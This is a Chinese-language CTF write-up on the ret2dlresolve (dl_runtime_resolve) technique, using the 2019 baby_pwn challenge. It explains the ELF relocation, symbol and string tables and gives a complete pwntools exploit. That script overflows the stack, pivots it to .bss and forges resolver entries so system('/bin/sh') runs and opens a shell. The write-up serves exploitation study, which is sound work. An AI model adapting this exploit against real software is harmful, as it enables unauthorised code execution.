# dl_runtime_resolve实例分析
## IDA静态分析

这里用2019信安国赛的baby_pwn来做演示(就是因为这个做不出来去做了好多功课)，实例程序test在文件夹下，hack.py是实现本地攻击的脚本  

首先使用checksec查看文件保护状态，由于是partial relo所以并没机会改写动态段的字符串表地址。所以我们直接伪造所有所需要的参数结构。

ida动态段信息如下  

---

![1.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/1.png)

---  

d_tag字段值为DT_JMPREL,DT_SYMTAB,DT_STRTAB,分别保存了重定位表，字符串表，符号表

重定位表信息如下  

---

![2.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/2.png)

---

比如read函数的重定位条目r_offset字段保存read got表中的位置，r_info保存了符号表索引，低8位保存了符号绑定信息  

更据符号表索引追踪符号表信息如下  

---  

![3.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/3.png)  

---    

第一个字段是st_name表示字符串在字符串表中偏移，其他字段的值我们伪造时仿造其他常规函数即可，他们详细信息定义在elf头文件中。

字符串表如下。

---  

![4.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/4.png)  

---  

## 伪造参数  

---  

![5.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/5.png)  

---  

程序漏洞点很容易定位，就在vuln函数中有一处栈溢出，但是只有一个read函数可以调用，没有机会泄漏libc，所以就直接考虑ret2dlruntime  

```  

from pwn import *

elf = ELF('test')

strTab = 0x804827c
symTab = 0x80481dc
relTab = 0x804833c

plt0At = 0x8048380
bssAt =  0x804a040
baseAt = bssAt + 0x500  

#这些是程序中的小gadget(可利用的小片段)用来处理栈迁移
pppRet = 0x80485d9
popEbpRet = 0x80485db  
leaveRet = 0x804854a 

readPlt = elf.plt['read']
readGot = elf.got['read']

#缓冲区填充
nop = cyclic(0x28)

rop1 = nop
rop1 += cyclic(0x4)
rop1 += p32(readPlt)
#上面用来覆盖返回地址为read函数，向可控制的bss段写入rop
#pppret作为返回地址，用来处理掉三个传递给read的函数
rop1 += p32(pppRet)
rop1 += p32(0)
rop1 += p32(baseAt-4)
rop1 += p32(0x100)
rop1 += p32(popEbpRet)
#迁移栈去ret plt0 我们在baseat处填入plt0的地址用于ret返回执行动态链接器
rop1 += p32(baseAt-4)
rop1 += p32(leaveRet)

#这是传递给dl_fixup函数的重定位条目偏移，几个4字节大小是用来计算伪造的重定位条目的地址
#这些4字节用于填充一些会用到的参数
relloc_offset = baseAt + 4 + 4 + 4 + 4 + 4 - relTab

#计算符号条目地址
symAt = relTab + relloc_offset + 0x8
#结构体要在内存中对齐
align = 0x10 - ((symAt-symTab)&0xf)
#计算出实际地址
symAt = symAt + align
#计算出表项索引
r_sym = (symAt - symTab)/0x10
r_info = (r_sym << 8) + 0x7
#伪造重定位条目
fakeRel = p32(readGot) + p32(r_info)

strAt = symAt + 0x10
st_name = strAt - strTab
#伪造符号表条目
fakeSym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

argStr = '/bin/sh\0'
funcStr = 'system\0'

argAt = strAt + len(funcStr)
#完成第二段rop的构造
rop2 = p32(baseAt-4)
rop2 += p32(plt0At)
rop2 += p32(relloc_offset)
rop2 += p32(readPlt)
rop2 += p32(argAt)
rop2 += cyclic(0x4)
rop2 += fakeRel
rop2 += '\0'*align
rop2 += fakeSym
rop2 += funcStr
rop2 += argStr  

r = process('./test')
r.send(rop1)
r.send(rop2)
r.interactive()

```  

## 测试  

---  

![6.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/6.png)  

---  







